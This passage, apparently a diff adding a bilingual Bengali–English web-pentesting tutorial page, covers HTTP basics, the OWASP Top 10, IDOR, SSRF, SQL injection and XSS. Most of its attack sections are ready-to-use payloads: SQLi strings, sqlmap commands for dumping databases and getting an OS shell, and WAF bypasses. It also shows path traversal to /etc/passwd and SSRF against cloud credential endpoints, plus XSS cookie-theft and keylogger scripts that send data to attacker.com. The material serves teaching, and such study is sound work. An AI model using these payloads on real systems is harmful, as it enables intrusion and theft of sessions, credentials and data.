+<span class="bl">Cookie:</span> session=abc123xyz               <span class="c"># <span class="bn-text">⭐ Session cookie!</span><span class="en-text">⭐ Session cookie!</span></span>
+<span class="bl">User-Agent:</span> Mozilla/5.0 ...
+<span class="bl">Referer:</span> https://target.com/login
+<span class="bl">X-Forwarded-For:</span> 192.168.1.1           <span class="c"># <span class="bn-text">IP spoofing এখানে</span><span class="en-text">IP spoofing here</span></span>
+                                         <span class="c"># (blank line)</span>
+<span class="y">username=admin&amp;password=1234</span>            <span class="c"># Body (POST data)</span>
+    </div>
+
+    <h2 class="sec">HTTP Response <span class="bn-text">স্ট্রাকচার</span><span class="en-text">Structure</span></h2>
+    <div class="code">
+<span class="c"># Server থেকে Response:</span>
+<span class="g">HTTP/1.1 200 OK</span>                        <span class="c"># Status code</span>
+<span class="bl">Content-Type:</span> text/html; charset=utf-8
+<span class="bl">Set-Cookie:</span> session=xyz789; HttpOnly; Secure   <span class="c"># <span class="bn-text">Cookie set করা</span><span class="en-text">Setting cookie</span></span>
+<span class="bl">X-Frame-Options:</span> DENY                  <span class="c"># <span class="bn-text">Clickjacking রোধ</span><span class="en-text">Prevent clickjacking</span></span>
+<span class="bl">X-XSS-Protection:</span> 1; mode=block        <span class="c"># <span class="bn-text">XSS protection</span><span class="en-text">XSS protection</span></span>
+<span class="bl">Content-Security-Policy:</span> default-src 'self'   <span class="c"># CSP</span>
+<span class="bl">Strict-Transport-Security:</span> max-age=31536000   <span class="c"># HTTPS force</span>
+<span class="bl">Server:</span> Apache/2.4.51                  <span class="c"># ⚠️ <span class="bn-text">Server info leak!</span><span class="en-text">Server info leak!</span></span>
+
+&lt;html&gt;...&lt;/html&gt;                       <span class="c"># Body</span>
+    </div>
+
+    <h2 class="sec">HTTP Methods — <span class="bn-text">কোনটি কতটা বিপজ্জনক?</span><span class="en-text">Which Is How Dangerous?</span></h2>
+    <table>
+      <thead><tr>
+        <th>Method</th>
+        <th><span class="bn-text">কাজ</span><span class="en-text">Purpose</span></th>
+        <th><span class="bn-text">নিরাপত্তা ঝুঁকি</span><span class="en-text">Security Risk</span></th>
+        <th><span class="bn-text">মাত্রা</span><span class="en-text">Severity</span></th>
+      </tr></thead>
+      <tbody>
+        <tr><td><strong>GET</strong></td><td><span class="bn-text">ডেটা পাওয়া</span><span class="en-text">Retrieve data</span></td><td><span class="bn-text">URL-এ data দেখা যায় (password!)</span><span class="en-text">Data visible in URL (password!)</span></td><td><span class="sev-medium">MEDIUM</span></td></tr>
+        <tr><td><strong>POST</strong></td><td><span class="bn-text">ডেটা পাঠানো</span><span class="en-text">Send data</span></td><td>CSRF <span class="bn-text">আক্রমণ সম্ভব</span><span class="en-text">attack possible</span></td><td><span class="sev-medium">MEDIUM</span></td></tr>
+        <tr><td><strong>PUT</strong></td><td><span class="bn-text">ফাইল আপলোড/আপডেট</span><span class="en-text">File upload/update</span></td><td><span class="bn-text">Webshell upload সম্ভব</span><span class="en-text">Webshell upload possible</span></td><td><span class="sev-critical">CRITICAL</span></td></tr>
+        <tr><td><strong>DELETE</strong></td><td><span class="bn-text">ডেটা মুছা</span><span class="en-text">Delete data</span></td><td><span class="bn-text">Data destruction</span><span class="en-text">Data destruction</span></td><td><span class="sev-high">HIGH</span></td></tr>
+        <tr><td><strong>OPTIONS</strong></td><td><span class="bn-text">Allowed methods দেখা</span><span class="en-text">View allowed methods</span></td><td><span class="bn-text">Attack surface reveal</span><span class="en-text">Reveals attack surface</span></td><td><span class="sev-low">LOW</span></td></tr>
+        <tr><td><strong>TRACE</strong></td><td><span class="bn-text">Request echo</span><span class="en-text">Request echo</span></td><td>XST (Cross-Site Tracing)</td><td><span class="sev-medium">MEDIUM</span></td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="sec">Status Codes — <span class="bn-text">Security-র দৃষ্টিতে</span><span class="en-text">From a Security Perspective</span></h2>
+    <div class="grid2">
+      <div class="card blue-card">
+        <h4><span class="bn-text">⭐ গুরুত্বপূর্ণ Status Codes</span><span class="en-text">⭐ Important Status Codes</span></h4>
+        <ul>
+          <li><code>200 OK</code> — <span class="bn-text">সফল, কিছু পাওয়া গেছে</span><span class="en-text">Success, found something</span></li>
+          <li><code>301/302</code> — Redirect (<span class="bn-text">Open Redirect দেখো</span><span class="en-text">Check for Open Redirect</span>)</li>
+          <li><code>401</code> — Unauthorized (<span class="bn-text">Auth লাগবে</span><span class="en-text">Auth required</span>)</li>
+          <li><code>403</code> — Forbidden (<span class="bn-text">Bypass চেষ্টা করো!</span><span class="en-text">Try to bypass!</span>)</li>
+          <li><code>404</code> — Not Found</li>
+          <li><code>500</code> — Server Error (<span class="bn-text">stack trace leak সম্ভব</span><span class="en-text">stack trace leak possible</span>)</li>
+          <li><code>503</code> — Service Unavailable (DoS?)</li>
+        </ul>
+      </div>
+      <div class="card danger-card">
+        <h4>🎯 <span class="bn-text">Pentest-এ যা খোঁজো</span><span class="en-text">What to Look for in Pentesting</span></h4>
+        <ul>
+          <li><span class="bn-text"><code>403</code> → 403 bypass technique চেষ্টা করো</span><span class="en-text"><code>403</code> → Try 403 bypass techniques</span></li>
+          <li><span class="bn-text"><code>500</code> → Error message-এ info leak?</span><span class="en-text"><code>500</code> → Info leak in error messages?</span></li>
+          <li><span class="bn-text"><code>200</code> on admin → Access control fail!</span><span class="en-text"><code>200</code> on admin → Access control fail!</span></li>
+          <li><span class="bn-text"><code>302</code> redirect → SSRF সম্ভব?</span><span class="en-text"><code>302</code> redirect → SSRF possible?</span></li>
+        </ul>
+      </div>
+    </div>
+
+    <h2 class="sec">Cookies — <span class="bn-text">Security Analysis</span><span class="en-text">Security Analysis</span></h2>
+    <div class="code">
+<span class="c"># ভালো Cookie (Secure):</span>
+Set-Cookie: session=xyz789; <span class="g">HttpOnly</span>; <span class="g">Secure</span>; <span class="g">SameSite=Strict</span>; Path=/; Max-Age=3600
+
+<span class="c"># খারাপ Cookie (Vulnerable):</span>
+Set-Cookie: session=xyz789;   <span class="c"># ⚠️ HttpOnly নেই → XSS দিয়ে চুরি!</span>
+Set-Cookie: session=xyz789; Secure;  <span class="c"># ⚠️ SameSite নেই → CSRF সম্ভব!</span>
+Set-Cookie: admin=true;       <span class="c"># ⚠️ Client-side trust → Tamper!</span>
+
+<span class="c"># Cookie attributes:</span>
+<span class="g">HttpOnly</span>   <span class="c"># → JS দিয়ে পড়া যাবে না (XSS থেকে রক্ষা)</span>
+<span class="g">Secure</span>     <span class="c"># → শুধু HTTPS-এ যাবে</span>
+<span class="g">SameSite</span>   <span class="c"># → Cross-site request রোধ (CSRF)</span>
+<span class="g">Domain</span>     <span class="c"># → কোন domain-এ যাবে</span>
+<span class="g">Path</span>       <span class="c"># → কোন path-এ যাবে</span>
+<span class="g">Max-Age</span>    <span class="c"># → কতক্ষণ থাকবে</span>
+    </div>
+
+    <div class="chapter-summary">
+      <h3>🎯 <span class="bn-text">HTTP Security Key Points</span><span class="en-text">HTTP Security Key Points</span></h3>
+      <ul>
+        <li>✅ <span class="bn-text">Request header-এ Cookie, Authorization দেখো → sensitive info পাবে</span><span class="en-text">Check Cookie, Authorization in request headers → find sensitive info</span></li>
+        <li>✅ <span class="bn-text">Response header-এ Server version → exploit খোঁজো</span><span class="en-text">Server version in response headers → find exploits</span></li>
+        <li>✅ <span class="bn-text">PUT, DELETE method enabled → Webshell upload সম্ভব</span><span class="en-text">PUT, DELETE method enabled → Webshell upload possible</span></li>
+        <li>✅ <span class="bn-text">Cookie-এ HttpOnly নেই → XSS দিয়ে session চুরি</span><span class="en-text">No HttpOnly on cookie → steal session with XSS</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════ CH 03: OWASP TOP 10 ══════════════════ -->
+<div class="chapter ch-owasp">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 03</div>
+    <div class="chapter-title">🔴 OWASP Top 10 (2021) — <span class="bn-text">সম্পূর্ণ গাইড</span><span class="en-text">Complete Guide</span></div>
+    <div class="chapter-desc"><span class="bn-text">Web Security-র সবচেয়ে বিপজ্জনক ১০টি দুর্বলতা</span><span class="en-text">The 10 most dangerous vulnerabilities in Web Security</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <div class="box info">
+      <div class="box-t">ℹ️ OWASP কী?</div>
+      <span class="bn-text">Open Web Application Security Project (OWASP) হলো একটি non-profit organization যারা web security নিয়ে কাজ করে। তারা প্রতি কয়েক বছর পর পর সবচেয়ে বিপজ্জনক web vulnerabilities-এর তালিকা প্রকাশ করে।</span>
+      <span class="en-text">The Open Web Application Security Project (OWASP) is a non-profit organization focused on web security. They publish a list of the most dangerous web vulnerabilities every few years.</span>
+    </div>
+
+    <div class="owasp-grid">
+
+      <div class="owasp-card">
+        <div class="owasp-card-header" style="background:linear-gradient(135deg,#7f0000,#c1121f);">
+          <div class="owasp-rank" style="background:rgba(0,0,0,0.3);">A01</div>
+          <div class="owasp-card-title">Broken Access Control</div>
+        </div>
+        <div class="owasp-card-body">
+          <p><span class="bn-text">অন্য user-এর data/page access করা। IDOR, privilege escalation। সবচেয়ে সাধারণ দুর্বলতা।</span><span class="en-text">Accessing other users' data/pages. IDOR, privilege escalation. Most common vulnerability.</span></p>
+          <div class="owasp-tags">
+            <span class="owasp-tag" style="color:#c1121f; border:1.5px solid #c1121f;">IDOR</span>
+            <span class="owasp-tag" style="color:#c1121f; border:1.5px solid #c1121f;">PrivEsc</span>
+            <span class="owasp-tag" style="color:#c1121f; border:1.5px solid #c1121f;">Path Traversal</span>
+            <span class="sev-critical">CRITICAL</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="owasp-card">
+        <div class="owasp-card-header" style="background:linear-gradient(135deg,#4a0072,#7b2d8b);">
+          <div class="owasp-rank" style="background:rgba(0,0,0,0.3);">A02</div>
+          <div class="owasp-card-title">Cryptographic Failures</div>
+        </div>
+        <div class="owasp-card-body">
+          <p><span class="bn-text">দুর্বল encryption বা plain text-এ sensitive data। MD5, SHA1 হ্যাশ, HTTP-তে password।</span><span class="en-text">Weak encryption or sensitive data in plain text. MD5, SHA1 hashes, passwords over HTTP.</span></p>
+          <div class="owasp-tags">
+            <span class="owasp-tag" style="color:#7b2d8b; border:1.5px solid #7b2d8b;">Weak Hash</span>
+            <span class="owasp-tag" style="color:#7b2d8b; border:1.5px solid #7b2d8b;">HTTP</span>
+            <span class="sev-high">HIGH</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="owasp-card">
+        <div class="owasp-card-header" style="background:linear-gradient(135deg,#c1121f,#e63946);">
+          <div class="owasp-rank" style="background:rgba(0,0,0,0.3);">A03</div>
+          <div class="owasp-card-title">Injection</div>
+        </div>
+        <div class="owasp-card-body">
+          <p><span class="bn-text">SQL Injection, XSS, Command Injection, LDAP Injection। Untrusted data interpreter-এ পাঠানো হলে।</span><span class="en-text">SQL Injection, XSS, Command Injection, LDAP Injection. When untrusted data is sent to an interpreter.</span></p>
+          <div class="owasp-tags">
+            <span class="owasp-tag" style="color:#c1121f; border:1.5px solid #c1121f;">SQLi</span>
+            <span class="owasp-tag" style="color:#c1121f; border:1.5px solid #c1121f;">XSS</span>
+            <span class="owasp-tag" style="color:#c1121f; border:1.5px solid #c1121f;">CMDi</span>
+            <span class="sev-critical">CRITICAL</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="owasp-card">
+        <div class="owasp-card-header" style="background:linear-gradient(135deg,#1a3c34,#2d6a4f);">
+          <div class="owasp-rank" style="background:rgba(0,0,0,0.3);">A04</div>
+          <div class="owasp-card-title">Insecure Design</div>
+        </div>
+        <div class="owasp-card-body">
+          <p><span class="bn-text">Design-এর সময়ই security ভাবা হয়নি। Password reset flaw, business logic error।</span><span class="en-text">Security wasn't considered during design. Password reset flaws, business logic errors.</span></p>
+          <div class="owasp-tags">
+            <span class="owasp-tag" style="color:#2d6a4f; border:1.5px solid #2d6a4f;">Logic Flaw</span>
+            <span class="owasp-tag" style="color:#2d6a4f; border:1.5px solid #2d6a4f;">Race Condition</span>
+            <span class="sev-high">HIGH</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="owasp-card">
+        <div class="owasp-card-header" style="background:linear-gradient(135deg,#854d0e,#b45309);">
+          <div class="owasp-rank" style="background:rgba(0,0,0,0.3);">A05</div>
+          <div class="owasp-card-title">Security Misconfiguration</div>
+        </div>
+        <div class="owasp-card-body">
+          <p><span class="bn-text">Default password, open S3 bucket, verbose error, directory listing চালু।</span><span class="en-text">Default passwords, open S3 buckets, verbose errors, directory listing enabled.</span></p>
+          <div class="owasp-tags">
+            <span class="owasp-tag" style="color:#b45309; border:1.5px solid #b45309;">Default Creds</span>
+            <span class="owasp-tag" style="color:#b45309; border:1.5px solid #b45309;">Dir Listing</span>
+            <span class="sev-high">HIGH</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="owasp-card">
+        <div class="owasp-card-header" style="background:linear-gradient(135deg,#0f3460,#0077b6);">
+          <div class="owasp-rank" style="background:rgba(0,0,0,0.3);">A06</div>
+          <div class="owasp-card-title">Vulnerable Components</div>
+        </div>
+        <div class="owasp-card-body">
+          <p><span class="bn-text">পুরনো version-এর library, framework, plugin ব্যবহার। Log4Shell, Heartbleed।</span><span class="en-text">Using outdated libraries, frameworks, plugins. Log4Shell, Heartbleed.</span></p>
+          <div class="owasp-tags">
+            <span class="owasp-tag" style="color:#0077b6; border:1.5px solid #0077b6;">CVE</span>
+            <span class="owasp-tag" style="color:#0077b6; border:1.5px solid #0077b6;">Log4Shell</span>
+            <span class="sev-critical">CRITICAL</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="owasp-card">
+        <div class="owasp-card-header" style="background:linear-gradient(135deg,#3d1f5c,#6d28d9);">
+          <div class="owasp-rank" style="background:rgba(0,0,0,0.3);">A07</div>
+          <div class="owasp-card-title">Auth &amp; Identification Failures</div>
+        </div>
+        <div class="owasp-card-body">
+          <p><span class="bn-text">Brute force, weak password, session fixation, broken password reset।</span><span class="en-text">Brute force, weak passwords, session fixation, broken password reset.</span></p>
+          <div class="owasp-tags">
+            <span class="owasp-tag" style="color:#6d28d9; border:1.5px solid #6d28d9;">Brute Force</span>
+            <span class="owasp-tag" style="color:#6d28d9; border:1.5px solid #6d28d9;">Session Fix</span>
+            <span class="sev-high">HIGH</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="owasp-card">
+        <div class="owasp-card-header" style="background:linear-gradient(135deg,#1a4731,#2d6a4f);">
+          <div class="owasp-rank" style="background:rgba(0,0,0,0.3);">A08</div>
+          <div class="owasp-card-title">Software &amp; Data Integrity Failures</div>
+        </div>
+        <div class="owasp-card-body">
+          <p><span class="bn-text">CI/CD pipeline attack, insecure deserialization, unsigned update।</span><span class="en-text">CI/CD pipeline attacks, insecure deserialization, unsigned updates.</span></p>
+          <div class="owasp-tags">
+            <span class="owasp-tag" style="color:#2d6a4f; border:1.5px solid #2d6a4f;">Deserialize</span>
+            <span class="owasp-tag" style="color:#2d6a4f; border:1.5px solid #2d6a4f;">Supply Chain</span>
+            <span class="sev-high">HIGH</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="owasp-card">
+        <div class="owasp-card-header" style="background:linear-gradient(135deg,#1a2332,#2d3748);">
+          <div class="owasp-rank" style="background:rgba(255,255,255,0.2);">A09</div>
+          <div class="owasp-card-title">Security Logging Failures</div>
+        </div>
+        <div class="owasp-card-body">
+          <p><span class="bn-text">Attack log না রাখা। Attack ঘটে গেলে কেউ জানতে পারে না।</span><span class="en-text">Not logging attacks. When an attack happens, no one can detect it.</span></p>
+          <div class="owasp-tags">
+            <span class="owasp-tag" style="color:#4a5568; border:1.5px solid #4a5568;">No Logging</span>
+            <span class="owasp-tag" style="color:#4a5568; border:1.5px solid #4a5568;">No Monitoring</span>
+            <span class="sev-medium">MEDIUM</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="owasp-card">
+        <div class="owasp-card-header" style="background:linear-gradient(135deg,#7f0000,#c1121f);">
+          <div class="owasp-rank" style="background:rgba(0,0,0,0.3);">A10</div>
+          <div class="owasp-card-title">Server-Side Request Forgery (SSRF)</div>
+        </div>
+        <div class="owasp-card-body">
+          <p><span class="bn-text">Server-কে দিয়ে internal network-এ request পাঠানো। Cloud metadata চুরি।</span><span class="en-text">Making the server send requests to the internal network. Cloud metadata theft.</span></p>
+          <div class="owasp-tags">
+            <span class="owasp-tag" style="color:#c1121f; border:1.5px solid #c1121f;">SSRF</span>
+            <span class="owasp-tag" style="color:#c1121f; border:1.5px solid #c1121f;">Internal Access</span>
+            <span class="sev-critical">CRITICAL</span>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <h2 class="sec">IDOR — <span class="bn-text">Broken Access Control উদাহরণ</span><span class="en-text">Broken Access Control Example</span></h2>
+    <div class="code">
+<span class="c"># IDOR (Insecure Direct Object Reference) — সবচেয়ে সাধারণ ভুল</span>
+
+<span class="c"># ভুল: URL-এ user ID সরাসরি</span>
+GET /api/user/<span class="r">1001</span>/profile    <span class="c"># তোমার account</span>
+GET /api/user/<span class="r">1002</span>/profile    <span class="c"># অন্যের account! — server check করে না!</span>
+
+<span class="c"># ভুল: File download</span>
+GET /download?file=invoice_1001.pdf
+GET /download?file=invoice_1002.pdf    <span class="c"># অন্যের invoice!</span>
+
+<span class="c"># ভুল: Admin panel</span>
+GET /admin/dashboard    <span class="c"># Login করা user-ও access পায়!</span>
+
+<span class="c"># Path Traversal</span>
+GET /download?file=../../../etc/passwd
+GET /download?file=..%2F..%2F..%2Fetc%2Fpasswd    <span class="c"># URL encoded</span>
+    </div>
+
+    <h2 class="sec">SSRF — <span class="bn-text">Server-Side Request Forgery</span><span class="en-text">Server-Side Request Forgery</span></h2>
+    <div class="code">
+<span class="c"># SSRF: Server-কে দিয়ে internal request পাঠানো</span>
+
+<span class="c"># Normal: বাইরের URL</span>
+POST /fetch-url
+url=https://example.com/image.png
+
+<span class="c"># SSRF: Internal network access</span>
+url=http://localhost/admin                    <span class="c"># Internal admin panel</span>
+url=http://192.168.1.1/                      <span class="c"># Router access</span>
+url=http://10.0.0.1:8080/api/secret          <span class="c"># Internal API</span>
+
+<span class="c"># ⭐ Cloud metadata — AWS</span>
+url=http://169.254.169.254/latest/meta-data/
+url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+<span class="c"># → AWS Secret Key পাওয়া যায়!</span>
+
+<span class="c"># SSRF bypass techniques</span>
+url=http://127.0.0.1                         <span class="c"># localhost</span>
+url=http://0.0.0.0                           <span class="c"># all interfaces</span>
+url=http://[::1]                             <span class="c"># IPv6 localhost</span>
+url=http://2130706433                        <span class="c"># 127.0.0.1 decimal</span>
+url=http://0177.0.0.1                        <span class="c"># Octal</span>
+    </div>
+
+    <div class="chapter-summary">
+      <h3>🔴 OWASP Top 10 <span class="bn-text">মনে রাখো</span><span class="en-text">Remember</span></h3>
+      <ul>
+        <li>🥇 A01 Broken Access Control — <span class="bn-text">সবচেয়ে বেশি দেখা যায়, IDOR চেক করো</span><span class="en-text">Most common, check IDOR</span></li>
+        <li>🥈 A03 Injection — SQL, XSS, Command — <span class="bn-text">সব input test করো</span><span class="en-text">Test all inputs</span></li>
+        <li>🥉 A07 Auth Failures — <span class="bn-text">Brute force, session attack</span><span class="en-text">Brute force, session attacks</span></li>
+        <li>⚡ A10 SSRF — <span class="bn-text">Cloud-এ সবচেয়ে বিপজ্জনক</span><span class="en-text">Most dangerous in cloud</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════ CH 04: SQL INJECTION ══════════════════ -->
+<div class="chapter ch-sqli">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 04</div>
+    <div class="chapter-title">💉 SQL Injection — <span class="bn-text">সম্পূর্ণ গাইড</span><span class="en-text">Complete Guide</span></div>
+    <div class="chapter-desc"><span class="bn-text">Database থেকে data চুরি করার সবচেয়ে পুরনো ও শক্তিশালী পদ্ধতি</span><span class="en-text">The oldest and most powerful method for stealing data from databases</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">SQL Injection <span class="bn-text">কীভাবে কাজ করে?</span><span class="en-text">How Does SQL Injection Work?</span></h2>
+    <div class="diagram">
+<pre>
+<span class="c"># Normal Query:</span>
+SELECT * FROM users WHERE username='<span class="dg">admin</span>' AND password='<span class="dg">mypassword</span>'
+
+<span class="c"># Attacker-এর input: admin'--</span>
+SELECT * FROM users WHERE username='<span class="dr">admin'--</span>' AND password='anything'
+                                          <span class="dr">↑ Comment! বাকি query ignore</span>
+
+<span class="c"># Result: admin হিসেবে login সফল!</span>
+</pre>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">SQLi-র ধরন</span><span class="en-text">Types of SQLi</span></h2>
+
+    <h3 class="sub">1. In-Band SQLi (<span class="bn-text">সবচেয়ে সহজ</span><span class="en-text">Easiest</span>)</h3>
+    <div class="code">
+<span class="c"># Error-based: Error message-এ DB তথ্য পাওয়া</span>
+' OR 1=1--
+' OR '1'='1
+admin'--
+" OR ""="
+' OR 1=1#              <span class="c"># MySQL comment</span>
+
+<span class="c"># UNION-based: Data সরাসরি বের করা</span>
+<span class="c"># ১ম ধাপ: কলাম সংখ্যা বের করো</span>
+' ORDER BY 1--         <span class="c"># OK</span>
+' ORDER BY 2--         <span class="c"># OK</span>
+' ORDER BY 3--         <span class="c"># Error → 2 column!</span>
+
+<span class="c"># ২য় ধাপ: Data বের করা</span>
+' UNION SELECT 1,2--
+' UNION SELECT username,password FROM users--
+' UNION SELECT table_name,2 FROM information_schema.tables--
+' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'--
+    </div>
+
+    <h3 class="sub">2. Blind SQLi (<span class="bn-text">সার্ভার কিছু দেখায় না</span><span class="en-text">Server shows nothing</span>)</h3>
+    <div class="code">
+<span class="c"># Boolean-based: True/False দেখে বোঝা</span>
+' AND 1=1--     <span class="c"># True → পেজ normal দেখাবে</span>
+' AND 1=2--     <span class="c"># False → পেজ ভিন্ন দেখাবে</span>
+
+<span class="c"># Username-এর প্রথম অক্ষর 'a' কিনা:</span>
+' AND SUBSTRING(username,1,1)='a'--
+
+<span class="c"># Time-based: দেরি দেখে বোঝা</span>
+' AND SLEEP(5)--              <span class="c"># MySQL</span>
+'; WAITFOR DELAY '0:0:5'--    <span class="c"># MSSQL</span>
+' AND 1=1 AND SLEEP(5)--      <span class="c"># True → 5 second দেরি</span>
+' AND 1=2 AND SLEEP(5)--      <span class="c"># False → দেরি নেই</span>
+    </div>
+
+    <h3 class="sub">3. SQLmap — <span class="bn-text">Automated Tool</span><span class="en-text">Automated Tool</span></h3>
+    <div class="code">
+<span class="c"># Basic scan</span>
+sqlmap -u "http://target.com/page?id=1"
+
+<span class="c"># সব database বের করো</span>
+sqlmap -u "http://target.com/page?id=1" --dbs
+
+<span class="c"># নির্দিষ্ট DB-র table</span>
+sqlmap -u "http://target.com/page?id=1" -D targetdb --tables
+
+<span class="c"># নির্দিষ্ট table-র data</span>
+sqlmap -u "http://target.com/page?id=1" -D targetdb -T users --dump
+
+<span class="c"># POST request</span>
+sqlmap -u "http://target.com/login" --data="user=admin&pass=1234" -p user
+
+<span class="c"># Burp Suite-এর request ফাইল থেকে</span>
+sqlmap -r request.txt --level=5 --risk=3
+
+<span class="c"># WAF bypass</span>
+sqlmap -u "..." --tamper=space2comment,randomcase,between
+
+<span class="c"># OS shell পাওয়া (যদি admin)</span>
+sqlmap -u "..." --os-shell
+
+<span class="c"># File read</span>
+sqlmap -u "..." --file-read=/etc/passwd
+    </div>
+
+    <h2 class="sec"><span class="bn-text">WAF Bypass Techniques</span><span class="en-text">WAF Bypass Techniques</span></h2>
+    <div class="code">
+<span class="c"># Space bypass</span>
+SELECT/**/username/**/FROM/**/users
+SELECT%09username%09FROM%09users    <span class="c"># Tab</span>
+SELECT+username+FROM+users          <span class="c"># Plus</span>
+
+<span class="c"># Case bypass</span>
+SeLeCt UsErNaMe FrOm UsErS
+
+<span class="c"># Double encoding</span>
+%27 OR 1%3D1--     <span class="c"># ' OR 1=1--</span>
+%2527            <span class="c"># Double encode</span>
+
+<span class="c"># Comment bypass</span>
+/*!SELECT*/ username /*!FROM*/ users
+
+<span class="c"># String concat</span>
+'adm'+'in'       <span class="c"># MSSQL</span>
+CONCAT('adm','in')  <span class="c"># MySQL</span>
+    </div>
+
+    <div class="box success">
+      <div class="box-t">🛡️ <span class="bn-text">SQLi থেকে রক্ষার উপায়</span><span class="en-text">How to Prevent SQLi</span></div>
+      <ul>
+        <li><strong>Prepared Statements</strong> / <strong>Parameterized Queries</strong> — <span class="bn-text">সবচেয়ে কার্যকর</span><span class="en-text">Most effective</span></li>
+        <li><strong>ORM</strong> (<span class="bn-text">Django, SQLAlchemy</span><span class="en-text">Django, SQLAlchemy</span>) <span class="bn-text">ব্যবহার করো</span><span class="en-text">Use an ORM</span></li>
+        <li><strong>Input Validation</strong> — <span class="bn-text">সব input sanitize করো</span><span class="en-text">Sanitize all inputs</span></li>
+        <li><strong>Least Privilege</strong> — <span class="bn-text">DB user-এর permission সীমিত রাখো</span><span class="en-text">Limit DB user permissions</span></li>
+        <li><strong>WAF</strong> — <span class="bn-text">একটি extra layer</span><span class="en-text">An extra layer</span></li>
+      </ul>
+    </div>
+
+    <div class="chapter-summary">
+      <h3>💉 SQL Injection <span class="bn-text">মনে রাখো</span><span class="en-text">Remember</span></h3>
+      <ul>
+        <li>✅ <span class="bn-text">প্রথমে <code>'</code> দিয়ে test করো — error আসলে SQLi সম্ভব</span><span class="en-text">Start testing with <code>'</code> — if error appears, SQLi is possible</span></li>
+        <li>✅ <span class="bn-text">UNION-based → সরাসরি data দেখা যায়</span><span class="en-text">UNION-based → data is directly visible</span></li>
+        <li>✅ <span class="bn-text">Blind → SLEEP() দিয়ে confirm করো</span><span class="en-text">Blind → Confirm with SLEEP()</span></li>
+        <li>✅ SQLmap <span class="bn-text">দিয়ে automate করো, manual-ও শেখো</span><span class="en-text">Automate with SQLmap, also learn manual</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════ CH 05: XSS ══════════════════ -->
+<div class="chapter ch-xss">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 05</div>
+    <div class="chapter-title">📜 Cross-Site Scripting (XSS)</div>
+    <div class="chapter-desc"><span class="bn-text">Browser-কে দিয়ে malicious script চালানো</span><span class="en-text">Running malicious scripts through the browser</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">XSS <span class="bn-text">কীভাবে কাজ করে?</span><span class="en-text">How Does XSS Work?</span></h2>
+    <div class="diagram">
+<pre>
+<span class="dy">Attacker</span>                    <span class="db">Server</span>                    <span class="dr">Victim</span>
+
+  1. Malicious script         3. Script store/reflect      4. Victim visit করে
+     inject করে ───────────►    করে ────────────────────►    page
+                                                          5. Script চলে victim-এর
+  6. Cookie/data ◄────────────────────────────────────────   browser-এ
+     পাঠায় attacker-কে
+</pre>
+    </div>
+
+    <h2 class="sec">XSS-এর <span class="bn-text">ধরন</span><span class="en-text">Types</span></h2>
+
+    <h3 class="sub">1. Reflected XSS</h3>
+    <div class="code">
+<span class="c"># URL parameter-এ script inject</span>
+https://target.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;
+
+<span class="c"># Server response-এ reflect হয়:</span>
+&lt;p&gt;Search results for: &lt;script&gt;alert('XSS')&lt;/script&gt;&lt;/p&gt;
+
+<span class="c"># Cookie steal payload:</span>
+&lt;script&gt;document.location='http://attacker.com/steal?c='+document.cookie&lt;/script&gt;
+    </div>
+
+    <h3 class="sub">2. Stored XSS (<span class="bn-text">সবচেয়ে বিপজ্জনক</span><span class="en-text">Most Dangerous</span>)</h3>
+    <div class="code">
+<span class="c"># Comment/Post-এ script store হয়</span>
+<span class="c"># যে কেউ page visit করলেই চলে!</span>
+
+<span class="c"># ভালো payload (comment box-এ):</span>
+&lt;script&gt;
+  var i = new Image();
+  i.src = 'http://attacker.com/steal?cookie=' + document.cookie;
+&lt;/script&gt;
+
+<span class="c"># Keylogger payload:</span>
+&lt;script&gt;
+  document.onkeypress = function(e) {
+    fetch('http://attacker.com/log?k=' + e.key);
+  }
+&lt;/script&gt;
+    </div>
+
+    <h3 class="sub">3. DOM-based XSS</h3>
+    <div class="code">
+<span class="c"># JavaScript-এই vulnerability — server involve নয়</span>
+<span class="c"># Vulnerable code:</span>
+document.getElementById('msg').innerHTML = location.hash.substring(1);
+
+<span class="c"># Attack URL:</span>
+https://target.com/page#&lt;img src=x onerror=alert(1)&gt;
+    </div>
+
+    <h2 class="sec">XSS Payload <span class="bn-text">সংগ্রহ</span><span class="en-text">Collection</span></h2>
+    <div class="code">
+<span class="c"># Basic test</span>
+&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+&lt;script&gt;alert(document.domain)&lt;/script&gt;
+
+<span class="c"># Image tag</span>
+&lt;img src=x onerror=alert(1)&gt;
+&lt;img src=x onerror="document.location='http://attacker.com?c='+document.cookie"&gt;
+
+<span class="c"># SVG</span>
+&lt;svg onload=alert(1)&gt;
+
+<span class="c"># Filter bypass</span>
+&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;         <span class="c"># Case</span>
+&lt;scr&lt;script&gt;ipt&gt;alert(1)          <span class="c"># Nested (filter naïve)</span>
+&lt;script&gt;alert&#40;1&#41;&lt;/script&gt;        <span class="c"># HTML encode</span>
+javascript:alert(1)                 <span class="c"># href XSS</span>
+
+<span class="c"># CSP bypass (CDN-hosted)</span>
+&lt;script src="https://cdnjs.cloudflare.com/..."&gt;&lt;/script&gt;
+
+<span class="c"># Cookie steal (all-in-one)</span>
